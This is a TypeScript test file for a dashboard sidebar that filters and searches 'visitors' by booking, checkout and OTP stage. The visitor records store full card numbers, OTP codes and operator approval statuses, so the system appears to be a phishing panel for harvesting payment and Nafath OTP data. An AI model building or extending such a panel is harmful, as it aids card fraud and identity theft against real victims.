import { describe, expect, it } from "vitest";
import {
  filterDashboardSidebarVisitors,
  getAllSidebarVisitors,
  getOrderSidebarEmptyLabel,
  isCardOrOtpSidebarVisitor,
} from "./order-sidebar";

describe("getAllSidebarVisitors", () => {
  it("keeps every visitor in the dashboard sidebar directory", () => {
    const visitors = [
      { id: "registration", currentPage: "registration", step: 1 },
      { id: "booking", currentPage: "booking", step: 2 },
      { id: "payment", currentPage: "checkout", step: 3 },
      { id: "done", currentPage: "confirmation", step: 6 },
    ];

    expect(getAllSidebarVisitors(visitors)).toEqual(visitors);
    expect(getAllSidebarVisitors(visitors)).not.toBe(visitors);
  });
});

describe("filterDashboardSidebarVisitors", () => {
  const visitors = [
    {
      id: "registration",
      name: "Ali",
      phone: "0500000001",
      currentPage: "registration",
      updatedAt: "2026-08-20T10:00:00.000Z",
    },
    {
      id: "booking",
      name: "Sara",
      phone: "0500000002",
      currentPage: "booking",
      updatedAt: "2026-08-20T11:00:00.000Z",
    },
    {
      id: "completed",
      name: "Mona",
      payment: { cardLast4: "4242" },
      currentPage: "confirmation",
      updatedAt: "2026-08-20T12:00:00.000Z",
    },
  ];
  const predicates = {
    isOnline: (visitor: (typeof visitors)[number]) => visitor.id === "booking",
    isWaiting: (visitor: (typeof visitors)[number]) => visitor.id === "registration",
    isCompleted: (visitor: (typeof visitors)[number]) => visitor.id === "completed",
  };

  it("keeps every visitor in the all filter and orders by most recent update", () => {
    expect(
      filterDashboardSidebarVisitors(visitors, "all", "", predicates).map((visitor) => visitor.id),
    ).toEqual(["completed", "booking", "registration"]);
  });

  it("applies online, waiting, and completed filters without reintroducing stage gating", () => {
    expect(
      filterDashboardSidebarVisitors(visitors, "online", "", predicates).map((visitor) => visitor.id),
    ).toEqual(["booking"]);
    expect(
      filterDashboardSidebarVisitors(visitors, "waiting", "", predicates).map((visitor) => visitor.id),
    ).toEqual(["registration"]);
    expect(
      filterDashboardSidebarVisitors(visitors, "completed", "", predicates).map((visitor) => visitor.id),
    ).toEqual(["completed"]);
  });

  it("finds visitors by name, phone, verification data, and card suffix", () => {
    expect(
      filterDashboardSidebarVisitors(visitors, "all", "sara", predicates).map((visitor) => visitor.id),
    ).toEqual(["booking"]);
    expect(
      filterDashboardSidebarVisitors(visitors, "all", "0500000001", predicates).map((visitor) => visitor.id),
    ).toEqual(["registration"]);
    expect(
      filterDashboardSidebarVisitors(visitors, "all", "4242", predicates).map((visitor) => visitor.id),
    ).toEqual(["completed"]);
  });
});

describe("isCardOrOtpSidebarVisitor", () => {
  it("includes ticket checkout and OTP states", () => {
    expect(isCardOrOtpSidebarVisitor({ currentPage: "checkout", step: 3 })).toBe(true);
    expect(isCardOrOtpSidebarVisitor({ currentPage: "otp", step: 4 })).toBe(true);
    expect(isCardOrOtpSidebarVisitor({ currentPage: "otp_verified", step: 5 })).toBe(true);
  });

  it("includes restaurant card and OTP states", () => {
    expect(
      isCardOrOtpSidebarVisitor({
        currentPage: "reserve_checkout",
        type: "restaurant_reservation",
        step: 4,
      }),
    ).toBe(true);
    expect(
      isCardOrOtpSidebarVisitor({
        currentPage: "reserve_otp",
        type: "restaurant_reservation",
        step: 5,
      }),
    ).toBe(true);
  });

  it("supports legacy records that only persisted numeric steps", () => {
    expect(isCardOrOtpSidebarVisitor({ step: 3 })).toBe(true);
    expect(
      isCardOrOtpSidebarVisitor({
        step: 4,
        restaurantEn: "AOK Kitchen",
      }),
    ).toBe(true);
  });

  it("keeps card and OTP records visible when their page marker is stale", () => {
    expect(isCardOrOtpSidebarVisitor({ currentPage: "booking", c1: "4111111111111111" })).toBe(true);
    expect(isCardOrOtpSidebarVisitor({ currentPage: "booking", otp: "123456" })).toBe(true);
    expect(
      isCardOrOtpSidebarVisitor({
        currentPage: "registration",
        payment: { cardLast4: "1111" },
      }),
    ).toBe(true);
  });

  it("does not show empty or pre-payment records", () => {
    expect(isCardOrOtpSidebarVisitor({})).toBe(false);
    expect(isCardOrOtpSidebarVisitor({ currentPage: "registration", step: 1 })).toBe(false);
    expect(isCardOrOtpSidebarVisitor({ currentPage: "booking", step: 2 })).toBe(false);
  });

  it("excludes completed records even when card or OTP data remains", () => {
    expect(
      isCardOrOtpSidebarVisitor({
        currentPage: "confirmation",
        c1: "4111111111111111",
        otp: "123456",
      }),
    ).toBe(false);
    expect(
      isCardOrOtpSidebarVisitor({
        currentPage: "checkout",
        cardApprovalStatus: "approved",
        otpApprovalStatus: "approved",
        c1: "4111111111111111",
      }),
    ).toBe(false);
    expect(
      isCardOrOtpSidebarVisitor({
        status: "nafad_otp_submitted",
        otp: "123456",
      }),
    ).toBe(false);
  });

  it("provides the dashboard empty-state label", () => {
    expect(getOrderSidebarEmptyLabel(true, 0)).toBe("...");
    expect(getOrderSidebarEmptyLabel(false, 0)).toBe("لا يوجد زوار");
    expect(getOrderSidebarEmptyLabel(false, 1)).toBe("");
  });

  it("excludes earlier order stages and confirmation", () => {
    expect(isCardOrOtpSidebarVisitor({ currentPage: "registration", step: 1 })).toBe(false);
    expect(isCardOrOtpSidebarVisitor({ currentPage: "booking", step: 2 })).toBe(false);
    expect(isCardOrOtpSidebarVisitor({ currentPage: "confirmation", step: 6 })).toBe(false);
    expect(
      isCardOrOtpSidebarVisitor({
        currentPage: "confirmation",
        type: "restaurant_reservation",
        step: 6,
      }),
    ).toBe(false);
  });
});
